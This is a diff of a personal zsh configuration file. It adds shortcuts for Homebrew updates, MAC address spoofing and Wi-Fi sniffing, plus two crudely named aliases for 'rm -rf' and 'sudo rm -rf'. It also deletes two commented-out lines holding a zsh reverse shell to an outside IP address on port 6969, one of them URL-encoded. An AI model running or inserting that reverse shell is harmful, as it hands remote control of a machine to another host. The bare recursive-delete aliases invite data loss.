@@ -190,8 +190,12 @@ compleat
 alias "speed=speedtest-cli"
 alias "en0=ifconfig en0"
 alias "spoofmymac=sudo spoof-mac randomize en0"
-alias "update-all=brew update && brew upgrade && omz 
-update"
+alias "spoofmyshit=sudo spoof-mac randomize en0"
+alias "updatemyshit=brew update && brew upgrade && omz update" 
+alias "update-all=brew update && brew upgrade && omz update"
+alias pfr="pip freeze > requirements.txt"
+alias  fuckoff="rm -rf"
+alias fuckyou="sudo rm -rf"
 
 ## Network
 alias sniff='sudo /usr/libexec/airportd en0 sniff'
@@ -405,7 +409,5 @@ export PATH="/opt/homebrew/opt/openjdk@11/bin:$PATH"
 export PATH="/opt/homebrew/opt/openjdk@11/bin:$PATH"
 export PATH="/opt/homebrew/opt/openjdk@17/bin:$PATH"
 
-#zsh%20-c%20'zmodload%20zsh/net/tcp%20&&%20ztcp%20108.18.206.140%206969%20&&%20zsh%20%3E&$REPLY%202%3E&$REPLY%200%3E&$REPLY'
-# zsh -c 'zmodload zsh/net/tcp && ztcp 108.18.206.140 6969 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
 export VISUAL=nano; export EDITOR=nano
 export PATH="/opt/homebrew/opt/openjdk/bin:$PATH"
